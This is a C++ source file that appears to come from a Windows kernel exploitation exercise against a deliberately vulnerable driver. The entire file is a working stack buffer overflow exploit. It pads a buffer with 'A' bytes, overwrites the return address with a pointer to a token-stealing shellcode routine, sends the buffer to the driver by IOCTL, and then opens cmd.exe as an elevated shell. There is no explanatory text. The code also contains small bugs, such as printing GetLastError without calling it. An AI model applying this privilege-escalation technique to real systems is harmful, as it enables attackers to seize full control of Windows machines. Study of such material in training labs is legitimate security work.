#include <Windows.h>
#include <iostream>

#include "Solutions.h"
#include "BufferOverflow.h"
#include "utils.h"

NTSTATUS Solutions::TriggerStackBufferOverflow() {
	DWORD dwBufSize = 0x820 + sizeof(DWORD);
	PUCHAR lpInBuffer = NULL;
	DWORD dwIoctl = IOCTL_STACK_OVERFLOW;
	DWORD dwBytesReturned = 0;

	std::cout << "[+] Device Handle " << std::hex << _hDeviceHandle << std::endl;

	lpInBuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufSize);

	if (!lpInBuffer) {
		std::cout << "[!] Failed to allocate memory - " << GetLastError() << std::endl;
		HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer);
		return 1;
	}

	RtlFillMemory(lpInBuffer, dwBufSize - 4, 0x41); // fill buffer with 'A'

	lpInBuffer[0x820] = (DWORD)&token_stealing_shellcode & 0xFF;
	lpInBuffer[0x821] = ((DWORD)&token_stealing_shellcode & 0xFF00) >> 8;
	lpInBuffer[0x822] = ((DWORD)&token_stealing_shellcode & 0xFF0000) >> 16;
	lpInBuffer[0x823] = ((DWORD)&token_stealing_shellcode & 0xFF000000) >> 24;

	std::cout << "[+] Sending IOCTL request with ioctl: 0x222003" << std::endl;
	std::cout << "[+] Buffer size: " << dwBufSize << std::endl;
	std::cout << "[+] Jumping to shellcode " << std::hex << (DWORD)&token_stealing_shellcode << std::endl;

	if (!DeviceIoControl(_hDeviceHandle,
		dwIoctl,
		(LPVOID)lpInBuffer,
		dwBufSize, NULL, 0, &dwBytesReturned, NULL))
	{
		std::cout << "[-] ERROR: " << GetLastError << " - could not talk with the driver" << std::endl;
		HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer);
		return 1;
	}

	std::cout << "[+] Talked succesfully with the driver" << std::endl;

	HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer);

	system("cmd.exe");
}